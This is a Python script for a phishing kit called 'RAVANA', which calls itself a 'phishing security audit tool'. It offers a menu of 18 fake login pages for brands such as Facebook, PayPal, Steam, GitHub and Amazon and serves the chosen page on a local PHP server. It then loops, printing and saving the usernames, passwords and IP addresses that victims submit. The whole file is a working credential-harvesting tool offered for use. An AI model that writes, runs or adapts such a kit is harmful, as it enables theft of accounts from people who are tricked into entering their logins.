import os
import time
from colorama import Fore
import re
from re import search
from os.path import isfile
from subprocess import DEVNULL, PIPE, Popen, STDOUT
from tqdm import tqdm

global site

def cat(file):
    if isfile(file):
        with open(file, "r") as filedata:
            return filedata.read()
    return ""

error_file = "logs/error.log"

def append(text, filename):
    with open(filename, "a") as file:
        file.write(str(text)+"\n")

def grep(regex, target):
    if isfile(target):
        content = cat(target)
    else:
        content = target
    results = search(regex, content)
    if results is not None:
        return results.group(1)
    return ""

cf_file = "logs/access.log"
cf_log = open(cf_file, 'w')

def setup(site):
    print('\n[~] initialization a server ....')

    for i in tqdm(range(100)):

        time.sleep(0.006)

    print('')
    print('[~] Port : 8080 [127.0.0.1 or localhost]')
    os.system(f"php -S localhost:8080 -t pages/{site} > /dev/null 2>&1 & ")
    time.sleep(2)
    print('\n[~] starting a server : ✔️')
    for i in tqdm(range(100)):
        time.sleep(0.005)
    time.sleep(2)
    print('\n[~] waiting for data .. ')
    while True:
        if os.path.isfile(f'pages/{site}/usuarios.txt'):
            os.system(f"cat pages/{site}/usuarios.txt")
            os.system(f"cat pages/{site}/usuarios.txt >> pages/{site}/usuarios_guardados.txt")
            os.system(f"rm -rf pages/{site}/usuarios.txt")
        if os.path.isfile(f'pages/{site}/ip.txt'):
            print('\n[!] IP address!')
            os.system(f"cat pages/{site}/ip.txt")
            os.system(f"cat pages/{site}/ip.txt >> pages/{site}/ip_guardados.txt")
            os.system(f"rm -rf pages/{site}/ip.txt")
            print('')

def menu():
    os.system("killall php")
    os.system("clear")
    print("""\033[92m
 ███████████     █████████   █████   █████   █████████   ██████   █████   █████████  
░░███░░░░░███   ███░░░░░███ ░░███   ░░███   ███░░░░░███ ░░██████ ░░███   ███░░░░░███ 
 ░███    ░███  ░███    ░███  ░███    ░███  ░███    ░███  ░███░███ ░███  ░███    ░███ 
 ░██████████   ░███████████  ░███    ░███  ░███████████  ░███░░███░███  ░███████████ 
 ░███░░░░░███  ░███░░░░░███  ░░███   ███   ░███░░░░░███  ░███ ░░██████  ░███░░░░░███ 
 ░███    ░███  ░███    ░███   ░░░█████░    ░███    ░███  ░███  ░░█████  ░███    ░███ 
 █████   █████ █████   █████    ░░███      █████   █████ █████  ░░█████ █████   █████

        Created by sabarish_hacker 😈 [Ravana eye]

        powerful phishing security audit tool 🫡 

    """)
    print("""
    [1] Facebook   [2] Twitter [3] Discord

    [4] Paypal     [5] Steam   [6] Instagram
    
    [7] apple      [8] portal
          
    [9] pinterest  [10] gitlab
          
    [11] adobe     [12] amazon
          
    [13] GitHub    [14] linkedin
          
    [15] playstation [16] twitch
          
    [17] wordpress  [18] yahoo

    """)

    inl = int(input('\nsabarish_hacker $ '))
    if inl == 1:
          site = "Facebook_en"
          setup(site)
    elif inl == 2:
          site = "Twitter_en"
          setup(site)
    elif inl == 3:
          site = "discord"
          setup(site)
    elif inl == 4:
        site = "paypal"
        setup(site)
    elif inl == 5:
          site = "Steam"
          setup(site)
    elif inl == 6:
        site = "instagram"
        setup(site)
    elif inl == 7:
        site = "apple"
        setup(site)
    elif inl == 8:
        site = "srm"
        setup(site)
    elif inl == 9:
        site = "pinterest"
        setup(site)
    elif inl == 10:
        site = "gitlab"
        setup(site)
    elif inl == 11:
        site = "adobe"
        setup(site)
    elif inl == 12:
        site = "amazon"
        setup(site)
    elif inl == 14:
        site = "linkedin"
        setup(site)
    elif inl == 15:
        site = "playstation"
        setup(site)
    elif inl == 13:
        site = "GitHub"
        setup(site)
    elif inl == 16:
        site = "twitch"
        setup(site)
    elif inl == 17:
        site = "wordpress"
        setup(site)
    elif inl == 18:
        site = "yahoo"
        setup(site)
    else:
        print(f'{Fore.RED}\n[!] Error !')
        time.sleep(2)
        menu()


if __name__ == "__main__":
     menu()
